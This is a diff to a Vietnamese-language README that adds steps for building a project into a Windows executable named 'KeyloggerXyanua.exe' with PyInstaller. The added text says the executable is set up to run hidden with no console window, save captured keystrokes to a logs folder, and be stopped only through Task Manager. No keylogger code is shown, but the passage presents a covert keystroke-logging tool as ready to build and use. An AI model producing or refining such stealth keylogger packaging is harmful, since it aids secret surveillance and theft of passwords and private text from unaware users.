@@ -77,6 +77,39 @@ sudo apt-get install -y python3-gi python3-gi-cairo gir1.2-gtk-3.0 libcairo2-dev
 pip install -r requirements.txt
 ```
 
+## Build thành file .exe
+
+### Yêu cầu
+- Windows 10/11
+- Python 3.10 trở lên
+- PyInstaller (đã được thêm vào requirements.txt)
+
+### Các bước build
+1. Cài đặt dependencies:
+```bash
+pip install -r requirements.txt
+```
+
+2. Chạy script build:
+```bash
+python build.py
+```
+
+3. File .exe sẽ được tạo trong thư mục `dist/`
+
+### Lưu ý khi build
+1. Đảm bảo đã cài đặt đầy đủ dependencies
+2. File .exe sẽ được tạo với tên `KeyloggerXyanua.exe`
+3. Thư mục `logs/` sẽ được tạo tự động khi chạy
+4. File .exe đã được cấu hình để chạy ẩn (không hiện console)
+5. Các file cấu hình cần được đặt trong thư mục `logs/`
+
+### Sử dụng file .exe
+1. Chạy file `KeyloggerXyanua.exe`
+2. Keylogger sẽ tự động chạy ẩn
+3. Logs sẽ được lưu trong thư mục `logs/`
+4. Để dừng keylogger, sử dụng Task Manager
+
 ## Sử dụng
 
 ### 1. Chạy keylogger
